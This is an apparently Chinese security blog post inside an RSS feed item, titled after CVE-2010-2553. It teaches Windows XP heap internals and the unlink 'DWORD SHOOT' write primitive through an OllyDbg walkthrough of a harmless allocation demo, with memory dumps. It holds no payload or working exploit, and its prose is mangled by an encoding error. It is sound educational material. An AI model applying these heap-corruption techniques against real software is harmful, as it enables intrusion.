        <category>å †æº¢å‡º</category>
        
        
        <category>äºŒè¿›åˆ¶</category>
        
      </item>
    
      <item>
        <title>æ¼æ´æˆ˜äº‰-cve-2010-2553</title>
        <description>&lt;h3 id=&quot;x00-&quot;&gt;0x00 å †æº¢å‡ºåŸºç¡€çŸ¥è¯†&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;good link:
    http://blog.csdn.net/ithzhang/article/details/12711431
    http://www.mottoin.com/87277.html
    http://www.voidcn.com/blog/u010797814/article/p-3924286.html

2&amp;gt;å †è¡¨åªç´¢å¼•æ‰€æœ‰çš„ç©ºé—²æ€å †å—,å·²åˆ†é…|å ç”¨çš„å †å—ç”±ä½¿ç”¨å®ƒçš„ç¨‹åºç´¢å¼•,ç©ºé—²æ€å †å—å’Œå ç”¨æ€å †å—:

    å †å—ä½¿ç”¨_HEAP_ENTYRç»“æ„æ¥æè¿°,è¯¥ç»“æ„å 8Byte. _HEAP_ENTRYç»“æ„ä¹‹åå°±æ˜¯ä¾›åº”ç”¨ç¨‹åºä½¿ç”¨çš„åŒºåŸŸ.è°ƒç”¨HeapAllocå‡½æ•°
    å°†è¿”å›HEAP_ENTRYä¹‹åçš„åœ°å€.æ­¤åœ°å€å‡å»8Byteä¾¿å¯ä»¥å¾—åˆ°_HEAP_ENTRYç»“æ„.å¯¹äºå·²ç»é‡Šæ”¾çš„å †å—,å †ç®¡ç†å™¨å®šä¹‰äº†
    _HEAP_FREE_ENTRYç»“æ„æ¥æè¿°.è¯¥ç»“æ„çš„å‰å…«ä¸ªå­—èŠ‚ä¸_HEAP_ENTRYç»“æ„å®Œå…¨ç›¸åŒ.ä½†å¢åŠ äº†8ä¸ªå­—èŠ‚æ¥å­˜å‚¨ç©ºé—²é“¾è¡¨çš„å¤´èŠ‚ç‚¹.
    _HEAP_FREE_ENTRYæ˜¯ç©ºé—²æ€å †å—ä¸­çš„å—é¦–(8byte)ä¸flink,blink(4+4=8)çš„æ€»å’Œ,_HEAP_FREE_ENTRYå…±16byte,_HEAP_ENTRY
    æ˜¯å ç”¨æ€å †å—ä¸­å¯¹åº”çš„å—é¦–çš„ç»“æ„,å¤§å°ä¸º8byte.
    å¦‚ä¸‹å›¾:
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/heap-1.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;3&amp;gt;å †æº¢å‡ºå®è´¨:
    ä¸€ä¸ªç©ºé—²å †å—(è®¾ä¸ºblockå †å—)çš„å¸ä¸‹å¿…å®šå¯¹åº”å¦‚ä¸‹æ“ä½œ:
    block.blink.flink=block.flink
    block.flink.blink=block.blink

    ä¹Ÿå³ç›¸å½“äºè¿™ä¸ªå †å—æœ‰å¦‚ä¸‹æ“ä½œ:
    [flink+4]=blink
    [blink]=flink

    å…¶ä¸­flinkä»£è¡¨ä¸‹ä¸€ä¸ªå †å—çš„ç´¢å¼•,blinkä»£è¡¨å‰ä¸€ä¸ªå †å—çš„ç´¢å¼•

    é€šå¸¸ä¸€ä¸ªå †å—çš„åˆ†é…(HeapAlloc)å¯¹åº”ä¸€ä¸ªç©ºé—²å †å—çš„å¸ä¸‹,ä¹Ÿå³å¯¹åº”ä¸€ä¸ªDWORD SHOOTæœºä¼š,å¯ä»¥åœ¨è¿™ä¸ªå †å—åˆ†é…å‰é€šè¿‡
    memcopy,strcpyç­‰æ“ä½œå°†è¿™ä¸ªåœ¨åˆ†é…å‰è¿˜å¤„äºç©ºé—²æ€çš„å †å—çš„flinkå’Œblinkè¦†ç›–æˆä»»æ„æ•°æ®,è¿™ä¸ªç©ºé—²æ€å †å—ä¸€æ—¦å‘ç”Ÿåˆ†é…
    ,å°†å¯¹åº”DWORD SHOOT

    0day2ä¸­p169é¡µä¸­çš„&quot;äº‹å®ä¸Š,å †å—çš„åˆ†é…,é‡Šæ”¾,åˆå¹¶æ“ä½œéƒ½èƒ½å¼•å‘DWORD SHOOT,ç”šè‡³å¿«è¡¨ä¹Ÿå¯ä»¥è¢«ç”¨
    æ¥åˆ¶é€ DWORD SHOOT&quot;çš„è¯´æ³•æœ‰å¾…è€ƒé‡,åˆ°ç›®å‰,ç¬”è€…åªè®¤åŒä¸€ä¸ªç©ºé—²å †å—çš„å¸ä¸‹,ä¹Ÿå³å¯¹åº”0day2è¿™å¥è¯ä¸­çš„&quot;å †å—çš„åˆ†é…&quot;èƒ½
    å¼•å‘DWORD SHOOT

4&amp;gt;è°ƒè¯•å †ä¸è°ƒè¯•æ ˆä¸åŒ,ä¸èƒ½ç›´æ¥ç”¨è°ƒè¯•å™¨æ¥åŠ è½½ç¨‹åº,å¦åˆ™å †ç®¡ç†å‡½æ•°ä¼šæ£€æµ‹åˆ°å½“å‰è¿›ç¨‹å¤„äºè°ƒè¯•çŠ¶æ€,è€Œä½¿ç”¨è°ƒè¯•æ€å †ç®¡ç†
  ç­–ç•¥
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x01-&quot;&gt;0x01 å †æº¢å‡ºåŸç†&lt;/h3&gt;

&lt;h4 id=&quot;day2&quot;&gt;1&amp;gt;0day2å®ä¾‹&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ç³»ç»Ÿ:winxp sp3+vc6.0

-----------------0dayheap.c-(page:152)--------
#include &amp;lt;windows.h&amp;gt;
int main()
{
    HLOCAL h1,h2,h3,h4,h5,h6;
    HANDLE hp;
    getchar();//å°†ä¹¦ä¸­ä¸‹é¢çš„__asm int 3æ”¹æˆè¿™é‡Œçš„getchar(),å› ä¸ºå®é™…ä¸­å°†odè®¾ä¸ºå®æ—¶è°ƒè¯•æç¤ºæœ‰é—®é¢˜
    hp=HeapCreate(0,0x1000,0x10000);//åˆ›å»ºä¸€ä¸ª0x1000=4096å¤§å°çš„å †
    //__asm int 3,ä¹¦ä¸­æ˜¯__asm int 3,åœ¨winxp sp3ä¸Šæµ‹è¯•ä¸­æ–­æ•ˆæœè¿˜å¥½,æ”¹æˆä¸Šé¢çš„getchar()

    h1=HeapAlloc(hp,HEAP_ZERO_MEMORY,3);
    h2=HeapAlloc(hp,HEAP_ZERO_MEMORY,5);
    h3=HeapAlloc(hp,HEAP_ZERO_MEMORY,6);
    h4=HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
    h5=HeapAlloc(hp,HEAP_ZERO_MEMORY,19);
    h6=HeapAlloc(hp,HEAP_ZERO_MEMORY,24);

    //free block and prevent coaleses
    HeapFree(hp,0,h1);//free to freelist[2]
    HeapFree(hp,0,h3);//free to freelist[2]
    HeapFree(hp,0,h5);//free to freelist[4]

    HeapFree(hp,0,h4);//coalese h3,h4,h5,link the large block to freelist[8]

    return 0;
}
--------------------end-----------------------

ç¼–è¯‘æˆreleaseç‰ˆæœ¬exe
åŒå‡»è¿è¡Œ0dayheap.exe
odé™„åŠ 
f9
alt+eé€‰æ‹©0dayheap.exe
åœ¨00401018çš„call HeapCreateå¤„ä¸‹æ–­

    00401018    FF15 08604000   call dword ptr ds:[&amp;lt;&amp;amp;KERNEL32.HeapCreate&amp;gt;; kernel32.HeapCreate
    0040101E    8B3D 04604000   mov edi,dword ptr ds:[&amp;lt;&amp;amp;KERNEL32.HeapAll&amp;gt;; ntdll.RtlAllocateHeap
    
åœ¨0dayheap.exeçš„çª—å£ä¸­è¾“å…¥&quot;a&quot;,enter
å‘ç°odæ²¡æœ‰æˆåŠŸä¸­æ–­,å¯èƒ½æ˜¯odçš„åŸå› 
alt+v
t
resume all threads
ä¸­æ–­åœ¨401018å¤„
f8
    æ­¤æ—¶eax=3a0000,ä¹Ÿå³heapcreateåˆ›å»ºçš„å †çš„èµ·å§‹åœ°å€ä¸º3a0000
åœ¨å¯„å­˜å™¨çª—å£ä¸­å³é”®eax,åœ¨æ•°æ®çª—å£ä¸­è·Ÿéš

    003A0000  C8 00 00 00 7A 01 00 00 FF EE FF EE 00 10 00 00  ?..z..ï£µ??..
    003A0010  00 00 00 00 00 FE 00 00 00 00 10 00 00 20 00 00  .....?..... ..
    003A0020  00 02 00 00 00 20 00 00 30 01 00 00 FF EF FD 7F  .... ..0..ï£µç¨
    003A0030  05 00 08 06 00 00 00 00 00 00 00 00 00 00 00 00  .............
    003A0040  00 00 00 00 98 05 3A 00 0F 00 00 00 F8 FF FF FF  ....?:....?ï£µï£µ
    003A0050  50 00 3A 00 50 00 3A 00 40 06 3A 00 00 00 00 00  P.:.P.:.@:.....
    003A0060  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
    003A0070  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................

alt+mä¹Ÿå¯ä»¥æŸ¥çœ‹å †çš„èµ·å§‹åœ°å€,å¦‚ä¸‹å›¾
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/heap-2.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;åœ¨003a000é‚£ä¸€è¡Œä¸Šå³é”®å¤åˆ¶ä¸€è¡Œ,ç²˜è´´å¦‚ä¸‹:
    Memory map, æ¡ç›® 15
     åœ°å€=003A0000
     å¤§å°=00001000 (4096.)
     å±ä¸»=         003A0000 (è‡ªèº«)
     åŒºæ®µ=
     ç±»å‹=Priv 00021004
     è®¿é—®=RW
     åˆå§‹è®¿é—®=RW

åœ¨æ•°æ®çª—å£ä¸­çš„003a0000çš„0x178åç§»ä¹Ÿå³3a0178,æ˜¯ç©ºè¡¨ç´¢å¼•,ä¹Ÿå³3a0178æŒ‡å‘freelist,3a0178å¤„çš„å€¼ä¸ºfreelistçš„ç¬¬ä¸€é¡¹å†…å®¹,å¦‚ä¸‹:
    
    003A0170  00 00 00 00 00 00 00 00      88 06 3A 00 88 06 3A 00  ........?:.?:.

    free[0]=0x003a0178
    free[0].flink=[3a0178]=003a0688
    free[0].blink=[3a0178+4]=003a0688

003a0688å¤„çš„æ•°æ®çª—å£å€¼å¦‚ä¸‹:

    003A0688  78 01 3A 00 78 01 3A 00 00 00 00 00 00 00 00 00  x:.x:.........
    003A0698  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................

    free[-1]=0x003a0688
    free[-1].flink=[3a0688]=003a0178    ====free[0]
    free[-1].blink=[3a0688+4]=003a0178
    
    å¯ä»¥çœ‹å‡ºHeapCreateäº§ç”Ÿçš„å †ä¸­çš„ç©ºè¡¨åªæœ‰ä¸¤é¡¹,ä¹Ÿå³åªæœ‰ä¸€ä¸ªå †å—,ä¸”å †å—ç´¢å¼•ä¸ºfree[-1]+8=0x003a0690
    h1=HeapAlloc(hp,HEAP_ZERO_MEMORY,3);//å®é™…åˆ†é…16å­—èŠ‚(2ä¸ªå †å—å¤§å°),é¢„æµ‹h1=0x3a0690
    h2=HeapAlloc(hp,HEAP_ZERO_MEMORY,5);//å®é™…åˆ†é…16å­—èŠ‚(2ä¸ªå †å—å¤§å°),é¢„æµ‹h2=0x3a0690+16=0x3a06a0
    h3=HeapAlloc(hp,HEAP_ZERO_MEMORY,6);//å®é™…åˆ†é…16å­—èŠ‚(2ä¸ªå †å—å¤§å°),é¢„æµ‹h3=0x3a0690+16*2=0x3a06b0
    h4=HeapAlloc(hp,HEAP_ZERO_MEMORY,8);//å®é™…åˆ†é…16å­—èŠ‚(2ä¸ªå †å—å¤§å°),é¢„æµ‹h4=0x3a0690+16*3=0x3a06c0
    h5=HeapAlloc(hp,HEAP_ZERO_MEMORY,19);//å®é™…åˆ†é…32å­—èŠ‚(4ä¸ªå †å—å¤§å°),é¢„æµ‹h5=0x3a0690+16*4=0x3a06d0
    h6=HeapAlloc(hp,HEAP_ZERO_MEMORY,24);//å®é™…åˆ†é…32å­—èŠ‚(4ä¸ªå †å—å¤§å°),é¢„æµ‹h6=0x3a0690+16*4+32=0x3a06f0
    h1-h6å…±åˆ†é…128ä¸ªå­—èŠ‚,128/8=16ä¸ªå †å•å…ƒ

åœ¨å…­å¤„HeapAllocä¸Šä¸‹æ–­

    00401018    FF15 08604000   call dword ptr ds:[&amp;lt;&amp;amp;KERNEL32.HeapCreate&amp;gt;]          ; kernel32.HeapCreate
    0040101E    8B3D 04604000   mov edi,dword ptr ds:[&amp;lt;&amp;amp;KERNEL32.HeapAlloc&amp;gt;]        ; ntdll.RtlAllocateHeap
    00401024    8BF0            mov esi,eax
    00401026    6A 03           push 0x3
    00401028    6A 08           push 0x8
    0040102A    56              push esi
    0040102B    FFD7            call edi     --------&amp;gt;f2
    0040102D    6A 05           push 0x5
    0040102F    6A 08           push 0x8
    00401031    56              push esi
    00401032    8BD8            mov ebx,eax
    00401034    FFD7            call edi     --------&amp;gt;f2
    00401036    6A 06           push 0x6
    00401038    6A 08           push 0x8
    0040103A    56              push esi
    0040103B    FFD7            call edi     --------&amp;gt;f2
    0040103D    6A 08           push 0x8
    0040103F    6A 08           push 0x8
    00401041    56              push esi
    00401042    8BE8            mov ebp,eax
    00401044    FFD7            call edi     --------&amp;gt;f2
    00401046    6A 13           push 0x13
    00401048    6A 08           push 0x8
    0040104A    56              push esi
    0040104B    894424 20       mov dword ptr ss:[esp+0x20],eax
    0040104F    FFD7            call edi     --------&amp;gt;f2
    00401051    6A 18           push 0x18
    00401053    6A 08           push 0x8
    00401055    56              push esi
    00401056    894424 1C       mov dword ptr ss:[esp+0x1C],eax
    0040105A    FFD7            call edi     --------&amp;gt;f2

f8
f8
..
(eip=0x40102d)
    åˆ°40102då¤„eax=0x3a0688,ä¹Ÿå³h1=0x3a0688,è¯´æ˜é¢„æµ‹é”™äº†,å› ä¸ºåˆ†é…ä¸Šé¢å”¯ä¸€çš„å †å—(free[-1]=003a0688)åˆ†é…ä»¥åå°±ä¸
    å†æ˜¯ç©ºé—²å †å—äº†,å˜æˆå ç”¨æ€çš„å †å—,å ç”¨æ€çš„å †å—æ˜¯æ²¡æœ‰flinkå’Œblikçš„,ä¹Ÿå³å ç”¨æ€çš„å †å—çš„ç´¢å¼•ä¸å±äºç©ºè¡¨ä¸­,å±äº
    åº”ç”¨ç¨‹åº.ä¸Šé¢å”¯ä¸€çš„å †å—åˆ†å‰²ä»¥åçš„å †å—æ˜¯åœ¨0x3a0688å¤„å‰²ä¸‹16ä¸ªå­—èŠ‚(h1çš„å¤§å°)åå‰©ä¸‹çš„å”¯ä¸€çš„å †å—
    ç°åœ¨0x3a688å¤„çš„æ•°æ®å¦‚ä¸‹:
        
    003A0688  00 00 00 00 78 01 3A 00 2E 01 02 00 00 10 00 00  ....x:......
    003A0698  78 01 3A 00 78 01 3A 00 00 00 00 00 00 00 00 00  x:.x:.........

    é‡æ–°é¢„æµ‹:
    h1=003a0688
        h1å †å—çš„å—é¦–åœ¨h1-8=3a0680å¤„:
        003A0680:
        02 00 08 00 AA 01 0D 00          ..?..
        å—é¦–çš„å‰2ä¸ªå­—èŠ‚å¯¹åº”å½“å‰å †å—çš„å¤§å°(å †å—çš„ä¸ªæ•°,æ¯ä¸ªå †å—å•ä½ä¸º8å­—èŠ‚å¤§å°),ç¬¬3-4ä¸ªå­—èŠ‚å¯¹åº”å‰ä¸€ä¸ªå †å—å¤§å°,è¿™
        é‡Œå‰2ä¸ªå­—èŠ‚ä¸º0002,ä¹Ÿå³å½“å‰å †å—å¤§å°ä¸º2ä¸ªå †å—,ç¬¬3-4å­—èŠ‚ä¸º0008,å³å‰ä¸€ä¸ªå †å—å¤§å°ä¸º8ä¸ªå †å—
    h2=003a0698
    h3=003a06a8
    h4=003a06b8
    h5=003a06c8
    h6=003a06e8

f8
f8
...
(eip=00401036)
    åˆ°00401036å¤„eax=3a0698,ä¹Ÿå³h2=0x3a0698ä¸é¢„æµ‹ç»“æœä¸€è‡´,h2å †å—çš„å—é¦–åœ¨h2-8=3a0690å¤„:
    003a0690:
    02 00 02 00 A8 01 0B 00          ..?.
    å‰2ä¸ªå­—èŠ‚ä¸º0002,ä¹Ÿå³å½“å‰å †å—å¤§å°ä¸º2,3-4ä¸ªå­—èŠ‚ä¸º0002,ä¹Ÿå³å‰ä¸€ä¸ªå †å—å¤§å°ä¸º2
    æ­¤æ—¶(h1,h2åˆ†é…å®Œæˆ,h3è¿˜æœªåˆ†é…)å¯¹åº”çš„ç©ºé—²å †å—ç´¢å¼•(free[-1])ä¸ºh2+8+8=003a06a0+8=003a06a8,å…¶ä¸­003a06a0ä¸ºç©ºé—²
    å †å—å—é¦–çš„åœ°å€,ç©ºé—²å †å—çš„ç´¢å¼•ä¸ºå—é¦–+8å¤„,å…·ä½“å¦‚ä¸‹:

    003A0698  00 00 00 00 00 01 3A 00 2C 01 02 00 00 10 00 00  .....:.,....
    003A06A8  78 01 3A 00 78 01 3A 00 00 00 00 00 00 00 00 00  x:.x:.........
    003A06B8  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
    ä¹Ÿå³ç©ºé—²å †å—çš„å—é¦–ä¸º2c 01 02 00 00 10 00 00==&amp;gt;å½“å‰ç©ºé—²å †å—å¤§å°ä¸º012c,å‰ä¸€ä¸ªå †å—å¤§å°ä¸º2
    æ­¤æ—¶çš„free[-1]=3a06a8,free[-1].flink=[3a06a8]=free[-1].blink=[3a06b0]=003a0178,ä¾ç„¶ä¸ºfree[0]

f8
f8
...
(eip=0040103D)
    åˆ°0040103Då¤„eax=3a06a8,ä¹Ÿå³h3=0x3a06a8ä¸é¢„æµ‹ç»“æœä¸€è‡´,h3å †å—çš„å—é¦–åœ¨h3-8=3a06a0å¤„:
    003A06A0  02 00 02 00 AE 01 0A 00 00 00 00 00 00 00 3A 00  ..?........:.
    å‰2ä¸ªå­—èŠ‚ä¸º0002,ä¹Ÿå³å½“å‰å †å—çš„å¤§å°ä¸º2,3-4ä¸ªå­—èŠ‚ä¸º0002,ä¹Ÿå³å‰ä¸€ä¸ªå †å—å¤§å°ä¸º2
    æ­¤æ—¶(h1,h2,h3åˆ†é…å®Œæˆ,h4è¿˜æ²¡åˆ†é…)å¯¹åº”çš„ç©ºé—²å †å—ç´¢å¼•(free[-1])ä¸ºh3+8+8=3a06b0+8=3a06b8,å…¶ä¸­003a06b0ä¸ºç©ºé—²å †
    å—å—é¦–çš„åœ°å€,ç©ºé—²å †å—çš„ç´¢å¼•ä¸ºå—é¦–+8å¤„,å…·ä½“å¦‚ä¸‹:
    003A06B0  2A 01 02 00 00 10 00 00 78 01 3A 00 78 01 3A 00  *....x:.x:.
    å½“å‰ç©ºé—²å †å—å¤§å°ä¸º012c-2=012a,å‰ä¸€ä¸ªå †å—å¤§å°ä¸º2
    åŒæ ·æ˜¯free[-1].flink=free[-1].blink=003a0178=free[0]

f8
f8
...
(eip=00401046)
    åˆ°00401046å¤„eax=3a06b8,ä¹Ÿå³h4=0x3a06b8ä¸é¢„æµ‹ç»“æœä¸€è‡´,h4å †å—çš„å—é¦–åœ¨h4-8=30a6b0å¤„:
    003A06B0  02 00 02 00 AC 01 08 00 00 00 00 00 00 00 00 00  ..?.........
    å½“å‰å †å—å¤§å°ä¸º2,å‰ä¸€ä¸ªå †å—å¤§å°ä¸º2
    h4åˆ†é…å®Œ,h5è¿˜æ²¡åˆ†é…,ç©ºé—²å †å—ç´¢å¼•(free[-1])ä¸ºh4+8+8=30a6c0+8=30a6c8
    æ•°æ®å¦‚ä¸‹:
    003A06C0  28 01 02 00 00 10 00 00 78 01 3A 00 78 01 3A 00  (....x:.x:.
    å½“å‰ç©ºé—²å †å—çš„å¤§å°ä¸º012a-2=0128,å‰ä¸€ä¸ªå †å—å¤§å°ä¸º2
    åŒæ ·æ˜¯free[-1].flink=free[-1].blink=003a0178=free[0]

f8
f8
...
(eip=00401051)
    åˆ°00401051å¤„eax=3a06c8,ä¹Ÿå³h5=0x3a06c8ä¸é¢„æµ‹ç»“æœä¸€è‡´,h5å †å—çš„å—é¦–åœ¨h5-8=3a06c0å¤„:
    003A06C0  04 00 02 00 A2 01 0D 00 00 00 00 00 00 00 00 00  ..?..........
    å½“å‰å †å—çš„å¤§å°ä¸º4,å‰ä¸€ä¸ªå †å—å¤§å°ä¸º2

f8
f8
...
(eip=0040105c)
    åˆ°0040105cå¤„eax=3a06e8,ä¹Ÿå³h6=0x3a06e8ä¸é¢„æµ‹ç»“æœä¸€è‡´,h6å †å—çš„å—é¦–åœ¨h6-8=3a06e0å¤„:
    003A06E0  04 00 04 00 A6 01 08 00 00 00 00 00 00 00 00 00  ..?.........
    å½“å‰å †å—å¤§å°ä¸º4,å‰ä¸€å †å—å¤§å°ä¸º4
    h6åˆ†é…å®Œ,ç©ºé—²å †å—ç´¢å¼•(free[-1])ä¸ºh6+8*3+8=3a0700+8=3a0708
    æ•°æ®å¦‚ä¸‹:
    003A0700  20 01 04 00 00 10 00 00 78 01 3A 00 78 01 3A 00   ....x:.x:.
    å½“å‰ç©ºé—²å †å—çš„å¤§å°ä¸º0128-4-4=0120,å‰ä¸€ä¸ªå †å—å¤§å°ä¸º4
    åŒæ ·æ˜¯free[-1].flink=free[-1].blink=003a0178=free[0]


åœ¨ä¸‹é¢çš„3ä¸ªå †å—é‡Šæ”¾(call heapfree,é‡Šæ”¾h1,h3,h5,h4)çš„å‡½æ•°ä¸‹æ–­

    0040105C    8B3D 00604000   mov edi,dword ptr ds:[&amp;lt;&amp;amp;KERNEL32.HeapFree&amp;gt;]         ; ntdll.RtlFreeHeap
    00401062    53              push ebx
    00401063    6A 00           push 0x0
    00401065    56              push esi
f2  00401066    FFD7            call edi                                            ; ntdll.RtlAllocateHeap
    00401068    55              push ebp
    00401069    6A 00           push 0x0
    0040106B    56              push esi
f2  0040106C    FFD7            call edi                                            ; ntdll.RtlAllocateHeap
    0040106E    8B4424 10       mov eax,dword ptr ss:[esp+0x10]
    00401072    50              push eax
    00401073    6A 00           push 0x0
    00401075    56              push esi
f2  00401076    FFD7            call edi                                            ; ntdll.RtlAllocateHeap
    00401078    8B4C24 14       mov ecx,dword ptr ss:[esp+0x14]
    0040107C    51              push ecx                                            ; ntdll.7C9301BB
    0040107D    6A 00           push 0x0
    0040107F    56              push esi
    00401080    FFD7            call edi                                            ; ntdll.RtlAllocateHeap
    00401082    5F              pop edi                                             ; 00320036
    00401083    5E              pop esi                                             ; 00320036
    00401084    5D              pop ebp                                             ; 00320036
    00401085    33C0            xor eax,eax
    00401087    5B              pop ebx                                             ; 00320036
    00401088    83C4 08         add esp,0x8
    0040108B    C3              retn

f8
f8
...
(eip=401068)
    åˆ°401068å¤„,h1å †å—è¢«é‡Šæ”¾,ç”±äºh1å®é™…åˆ†é…å¤§å°ä¸º2ä¸ªå †å•å…ƒå¤§å°(2*8=16å­—èŠ‚),é‡Šæ”¾åå°†é“¾å…¥free[2]è¿™ä¸ªç©ºé—²é“¾è¡¨ä¸­
    ,åœ¨h1é‡Šæ”¾ä¹‹å‰åªæœ‰free[0]è¿™ä¸€ä¸ªç©ºé—²é“¾è¡¨,h1é‡Šæ”¾åä¼šå¢åŠ ä¸€ä¸ªç©ºé—²é“¾è¡¨free[2],æ­¤æ—¶free[2]è¿™ä¸ªç©ºè¡¨åªæœ‰ä¸€ä¸ªç»“ç‚¹,æ­¤
    æ—¶free[0]é™„è¿‘æ•°æ®:

    eip=40105cæ—¶,ä¹Ÿå³ä¸Šé¢é‡Šæ”¾h1ä¹‹å‰,free[0]=3a0178,é™„è¿‘çš„æ•°æ®å¦‚ä¸‹:

    003A0170  00 00 00 00 00 00 00 00 08 07 3A 00 08 07 3A 00  ........:.:.
    003A0180  80 01 3A 00 80 01 3A 00 88 01 3A 00 88 01 3A 00  â‚¬:.â‚¬:.?:.?:.
    003A0190  90 01 3A 00 90 01 3A 00 98 01 3A 00 98 01 3A 00  ?:.?:.?:.?:.
    003A01A0  A0 01 3A 00 A0 01 3A 00 A8 01 3A 00 A8 01 3A 00  ?:.?:.?:.?:.
    003A01B0  B0 01 3A 00 B0 01 3A 00 B8 01 3A 00 B8 01 3A 00  ?:.?:.?:.?:.
    003A01C0  C0 01 3A 00 C0 01 3A 00 C8 01 3A 00 C8 01 3A 00  ?:.?:.?:.?:.
    003A01D0  D0 01 3A 00 D0 01 3A 00 D8 01 3A 00 D8 01 3A 00  ?:.?:.?:.?:.
    003A01E0  E0 01 3A 00 E0 01 3A 00 E8 01 3A 00 E8 01 3A 00  ?:.?:.?:.?:.
    003A01F0  F0 01 3A 00 F0 01 3A 00 F8 01 3A 00 F8 01 3A 00  ?:.?:.?:.?:.
    
    ç°åœ¨,eip=401068æ—¶,åˆšé‡Šæ”¾å®Œh1,free[0]=3a0178,é™„è¿‘æ•°æ®å¦‚ä¸‹:

    003A0170  00 00 00 00 00 00 00 00 08 07 3A 00 08 07 3A 00  ........:.:.
    003A0180  80 01 3A 00 80 01 3A 00(88 06 3A 00 88 06 3A 00) â‚¬:.â‚¬:.?:.?:.
    003A0190  90 01 3A 00 90 01 3A 00 98 01 3A 00 98 01 3A 00  ?:.?:.?:.?:.
    003A01A0  A0 01 3A 00 A0 01 3A 00 A8 01 3A 00 A8 01 3A 00  ?:.?:.?:.?:.
    003A01B0  B0 01 3A 00 B0 01 3A 00 B8 01 3A 00 B8 01 3A 00  ?:.?:.?:.?:.
    003A01C0  C0 01 3A 00 C0 01 3A 00 C8 01 3A 00 C8 01 3A 00  ?:.?:.?:.?:.
    003A01D0  D0 01 3A 00 D0 01 3A 00 D8 01 3A 00 D8 01 3A 00  ?:.?:.?:.?:.
    003A01E0  E0 01 3A 00 E0 01 3A 00 E8 01 3A 00 E8 01 3A 00  ?:.?:.?:.?:.
    003A01F0  F0 01 3A 00 F0 01 3A 00 F8 01 3A 00 F8 01 3A 00  ?:.?:.?:.?:.
    
    ä¸åŒä¹‹å¤„æ˜¯3a0188å’Œ3a018cå¤„çš„003a0188å˜æˆäº†003a0688,è€Œ003a0688æ­£æ˜¯h1çš„å€¼,è€Œh1é‡Šæ”¾åå°†é“¾å…¥free[2]çš„ç©ºè¡¨,è¯´æ˜
    3a0188æ­£æ˜¯free[2]è¿™ä¸ªä½ç½®,é‚£ä¹ˆ3a0180å°±æ˜¯free[1]çš„ä½ç½®,ä¹Ÿå³ä»+0x178å¼€å§‹,æœ‰128ä¸ªå…ƒç´ ,æ¯ä¸ª8å­—èŠ‚å¤§å°,è¿™
    128ä¸ªå…ƒç´ æ„æˆä¸€ä¸ªæŒ‡é’ˆæ•°ç»„,è¿™ä¸ªæ•°ç»„å«åš&quot;ç©ºè¡¨ç´¢å¼•&quot;,è¿™ä¸ªæ•°ç»„çš„æ¯ä¸€é¡¹åŒ…æ‹¬ä¸¤ä¸ªæŒ‡é’ˆ,æŒ‡é’ˆä»£è¡¨å¯¹åº”ç©ºè¡¨çš„ç¬¬ä¸€ä¸ªç©º
    é—²å †å—çš„å†…å­˜åœ°å€.

f8
f8
...
(eip=40106e)
    åˆ°è¿™é‡Œh3é‡Šæ”¾å®Œ,ç”±äºh3ä¹Ÿæ˜¯ä¸¤ä¸ªå †å—å•å…ƒå¤§å°,æ‰€ä»¥h3ä¹Ÿå°†é“¾å…¥åˆ°free[2]çš„ç©ºè¡¨å½“ä¸­
    å¯ä»¥é¢„æµ‹:
    free[2]å¤„çš„003a0688(free[2]çš„ç¬¬ä¸€ä¸ªç©ºé—²å †å—çš„ç´¢å¼•)å¯¹åº”çš„å†…å­˜å€¼[003a0688]=h3=003a06a8,è€Œ
    [003a0688+4]=free[2]=3a0188,è€Œ[003a06a8]=free[2]=003a0188,[003a06a8+4]=003a0688,free[2]ä¸º3a0188,h3é‡Šæ”¾å
    [3a0188]=3a0688,[3a0188+4]=3a06a8

    å®é™…ç¡®å®å¦‚æ­¤,å®é™…æ•°æ®å¦‚ä¸‹:

    003A0680  02 00 08 00 AA 00 0D 00 A8 06 3A 00 88 01 3A 00  ..?..?:.?:.

    003A06A0  02 00 02 00 AE 00 0A 00 88 01 3A 00 88 06 3A 00  ..?..?:.?:.

    003A0180  80 01 3A 00 80 01 3A 00 88 06 3A 00 A8 06 3A 00  â‚¬:.â‚¬:.?:.?:.

    å¦‚ä¸‹å›¾:
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/heap-3.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;f8
f8
...
(eip=401078)
    åˆ°è¿™é‡Œh5é‡Šæ”¾å®Œ,ç”±äºh5å®é™…åˆ†é…å¤§å°ä¸º4ä¸ªå †å—å•å…ƒå¤§å°,h5å †å—é‡Šæ”¾åå°†é“¾å…¥free[4]ç©ºè¡¨ä¸­,free[4]=3a0198
    å¯ä»¥é¢„æµ‹:
    [3a0198]=h5=003a06c8,[3a0198+4]=h5=003a06c8
    [003a06c8]=3a0198,[003a06c8+4]=3a0198
    
    å®é™…æ•°æ®å¦‚ä¸‹:

    003A0190  90 01 3A 00 90 01 3A 00 C8 06 3A 00 C8 06 3A 00  ?:.?:.?:.?:.

    003A06C0  04 00 02 00 A2 00 0D 00 98 01 3A 00 98 01 3A 00  ..?..?:.?:.
    ä¸é¢„æµ‹ç»“æœä¸€è‡´

f8
f8
...
(eip=401082)
